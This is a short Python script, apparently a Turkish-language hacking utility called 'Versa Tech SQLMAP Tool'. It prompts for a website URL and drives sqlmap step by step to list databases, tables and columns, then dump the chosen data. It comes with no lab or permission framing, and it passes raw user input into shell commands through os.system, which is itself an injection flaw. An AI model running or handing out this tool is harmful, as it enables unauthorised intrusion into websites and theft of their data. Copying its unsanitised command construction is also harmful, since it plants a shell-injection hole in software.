import random
import os
import time
from pyfiglet import Figlet






S = '\033[93m'
B = '\033[37m'
G = '\033[1;30;40m'
def uygulaSqlmap(komut):
    os.system(komut)

def versa():
    def olusturRandomRenk():
        return (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

    def metniBoyutlandirRenklendir(isim, font):
        startTime = time.time()
        while time.time() - startTime < 2:
            f = Figlet(font=font)
            yaziRenk = olusturRandomRenk()
            yaziBoyut = f.renderText(isim)
            metinRenk = f'''\x1b[38;2;{yaziRenk[0]};{yaziRenk[1]};{yaziRenk[2]}m{yaziBoyut}\x1b[0m'''
            os.system('clear')
            print(metinRenk)
            time.sleep(0.5)  

    metniBoyutlandirRenklendir('Versa', font='block')
    print(G+"             VERSA TECH SQLMAP TOOL")
    
    url = input(S+"Site URL Gir: "+B)
    
    databaseKomut = f"sqlmap -u \"{url}\" --batch --dbs"
    uygulaSqlmap(databaseKomut)
    
    dbIsmi = input(S+"Veritabanı Adı Gir (database bulunamadıysa 'x' e bas) : "+B)
    if dbIsmi.lower() == 'x':
        print(S+"Tool kapatılıyor.."+B)
        return
    
    tabloKomut = f"sqlmap -u \"{url}\" --batch -D \"{dbIsmi}\" --tables"
    uygulaSqlmap(tabloKomut)
    
    tabloIsmi = input(S+"Tablo Adı Gir: "+B)
    
    kolonKomut = f"sqlmap -u \"{url}\" --batch -D \"{dbIsmi}\" -T \"{tabloIsmi}\" --columns"
    uygulaSqlmap(kolonKomut)
    
    kolonIsmi = input(S+"Sütun Adı Gir: "+B)
    
    komutData = f"sqlmap -u \"{url}\" --batch -D \"{dbIsmi}\" -T \"{tabloIsmi}\" -C \"{kolonIsmi}\" --dump"
    uygulaSqlmap(komutData)

if __name__ == "__main__":
    versa()
